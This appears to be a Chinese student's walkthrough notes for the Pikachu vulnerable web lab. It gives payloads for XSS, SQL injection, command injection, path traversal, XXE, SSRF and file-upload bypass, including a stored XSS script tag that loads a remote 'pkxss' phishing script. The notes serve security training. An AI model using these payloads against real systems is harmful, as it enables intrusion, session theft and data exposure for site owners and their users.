1. 暴力破解
- 基于表单的暴力破解
#### 直接抓包破解密码就行
- 验证码绕过(on server)
- 验证码绕过(on client)
#### 这两个都只要输入正确的验证码抓包爆破密码就可以
- 验证码绕过(token 防爆破)
#### 11111还不会
2. xss
- 反射型xss(get)
#### 输入框无法输入过多字符，随便输一下，burp抓包，在数据包内修改,或者直接url修改
```
<script>alert(666)</script>
```
- 反射型xss(post)

- 存储型xss
#### 没有过滤，直接输入
    <script>alert(666)</script>
    <script src="http://192.168.250.97/p/pkxss/xfish/fish.php"></script>
- DOM型xss
#### 查看源码
    "<a href='"+str+"'>what do you see?</a>";
#### 需要闭合掉，可以
```
'><img src=1 onerror=alert('666')>
'><img src="https://www.baidu.com/img/bd_logo1.png">
```
- DOM型XSS
#### 需要闭合掉前面得就简单了
`'><img src=1 onerror=alert(1)>`
- DOM型XSS-X
#### 跟上一题一摸一样
- XSS盲打
#### 留言板输入内容，前台不会弹窗，管理员登录后台会弹窗
- XSS过滤
#### 过滤了script，尝试大小写混写过
`<ScRipt>alert('123')</ScRipt>`
- xss之htmlspecialchars
``` 
q’ onclick =‘alert(1111)’
javascript:alert(/xs/)
```
- xss之href输出
#### 输入之后查看源码，发现是被包含在href里面，可以用
    javascript:alert('666')
- xss之js输出
#### 输入之后，查看源码
```
<script>
    $ms='aaaaa';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }
    }
</script>
```
可以闭合前面的script
```
'</script><script>alert('12')</script>
```
3. csrf
- csrf(get)
#### 登录后修改个人信息直接抓包，可以任意修改，在新标签页粘贴在地址后面打开，修改即可成功
- csrf(post)
#### 
- csrf token
#### 加入了token，好像不好再伪造了
4. sql注入
- 数字型注入(post)
#### 下拉表单直接抓包，发现id=1,直接在1后面跟即可,order by 3报错，有两列
    1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
- 字符型注入(get)
#### 提示字符型，尝试
    1' order by 2#
#### 不报错,尝试
    1’ order by 3#
#### 报错，说明有3列，直接开始查询 
    1' union select 1,database()#
- 搜索型注入
#### 跟字符型一样，只不过有三列数据
- xx型注入
#### 需要闭合，加个括号就可以开始注入
    1') order by 3#
- insert/update注入
#### 注册的时候或者更新的时候有注入点，注册的时候，点击按钮抓包，在用户名后输入
    q' or updatexml(1,concat(0x7e,database()),0) or'
    
    q' or updatexml(1,concat((select group_concat(table_name) from information_schema.tables where table_schema=database())),3)or'
- delete注入
#### 在删除的时候抓包，然后修改id
    id=1+or+updatexml(1,concat(0x7e,database()),0)
- http header注入
#### 抓包，在User-Agent的最后面加上
    ',updatexml(1,concat(1,(select database())),1))#
    ' or updatexml(1,concat(1,database()),0) or '
- 盲注(base on boolian)
#### 布尔盲注，直接开始注入就行
    kobe' and length(database())=7#
-盲注(base on time)
#### 时间盲注，直接开始注入就行，正确的话会睡眠指定秒数
    kobe' and if(length(database())=7,sleep(3),1)#
- 宽字节注入
#### 我们的payload的是【%df '】，其原理是当MySQL在使用GBK编码的时候，会认为两个字符是一个繁体汉字，然后让我们的单引号%27成功逃逸,在id与单引号之间加%df即可，mysql的特性，因为gbk是多字节编码，两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，而’逃逸了出来。根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%a1也可以。
    1%df' union select 1,database()#
5. REC
- exec"ping"
####  没有任何过滤，直接可以执行
     127.0.0.1&&ipconfig
- exec"evel
#### exec处理字符串里面的代码，而eval是处理字符串里面的表达式如：exec(“print 333”) 333,eval(“9+10”) 19
```
phpinfo();
```
6. unsafe filedownload
#### 可以直接点击下载后抓包，在数据包内修改
    filename=../../sqli/sqli.php
7. unsafe fileupload
- client check
#### 前端校验，所以可以直接上传后修改后缀为1.php
- mime type
#### 可以上传，抓包，修改文件类型为image/jpeg即可成功上传php
- getimagesize
#### 打不开上传不成功不知道为什么
8. over permission
- 水平越权
#### 登录后，直接在url或者数据包内把名称修改为想要的那个人即可
- 垂直越权
#### 有点看不太懂
9. 目录遍历
#### 还是看不太懂
10. 敏感信息泄露
#### 账号kobe密码123456登录后有一篇文章，但是这篇文章在不登录的情况下还是能被看到，只需复制url即可
11. php反序列化
```
class S{
   public $test="bihuoedu";
}
$s=new S(); //创建一个对象
serialize($s); //把这个对象进行序列化
序列化后得到的结果是这个样子的:
O:1:"S":1:{s:4:"test";s:8:"bihuoedu";}
O:代表object
    1:代表对象名字长度为一个字符
    S:对象的名称
    1:代表对象里面有一个变量
    s:数据类型
    4:变量名称的长度
    test:变量名称
    s:数据类型
    7:变量值的长度
    bihuoedu:变量值
```
#### 反序列化unserialize()就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。
#### 按着上面的构造payload
    O:1:"S":1:{s:4:"test";s:27:"<script>alert(111)</script>";}
#### 即可成功xss
    O:1:"S":1:{s:4:"test";s:7:"pikachu";}
#### 下面消息可以弹出变量值
12. XXE
#### html是用来显示数据的,xml是用来传输数据的
```
<?xml version = "1.0"?> <!DOCTYPE ANY [     <!ENTITY f SYSTEM "file:///C://1/flag.txt"> ]> <x>&f;</x>
```
13. url重定向
#### 分别点击四个链接，1,2没反应，3指向了概述，4当前页面多文字，url多了东西，可以
    url=http://www.baidu.com
#### 诱导别人去往钓鱼网站
14. ssrf
- ssrf(curl)
#### 点击后url后面指向了127.0.0.1，可以直接修改来访问其他文件
- ssrf(file_get_content)
#### 同样，可以直接
    ?file=file://C:/1/flag.txt
#### 查看文件